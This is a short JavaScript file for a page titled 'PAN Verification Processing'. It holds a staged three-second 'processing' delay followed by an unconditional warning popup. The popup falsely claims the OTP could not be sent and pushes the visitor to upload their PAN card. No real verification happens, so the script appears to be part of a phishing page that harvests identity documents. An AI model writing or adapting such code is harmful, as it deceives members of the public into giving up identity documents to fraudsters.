document.addEventListener('DOMContentLoaded', () => {
    console.log('PAN Verification Processing page loaded.');

    // --- Configuration ---
    // 3000ms = 3 seconds: After waiting this long, the popup will start.
    const initialHoldTime = 3000;

    console.log(`Holding on current page for ${initialHoldTime / 1000} seconds before showing popup...`);

    // --- Step 1: Wait for 3 seconds. ---
    setTimeout(() => {
        // Console log shows that it is now the turn of the popup.
        console.log('Initial delay complete. Showing popup now.');

        // --- Step 2: Show warning popup ---
        Swal.fire({
            title: 'PAN Not Linked with Mobile',
            text: 'We could not send OTP. Please upload your PAN card for manual verification.',
            icon: 'warning',
            showCancelButton: true,
            cancelButtonText: 'Cancel',
            confirmButtonText: 'Upload PAN Card',
            reverseButtons: true
        }).then((result) => {
            if (result.isConfirmed) {
                window.location.href = '/upload_pan_document';
            }
        });
    }, initialHoldTime);
});
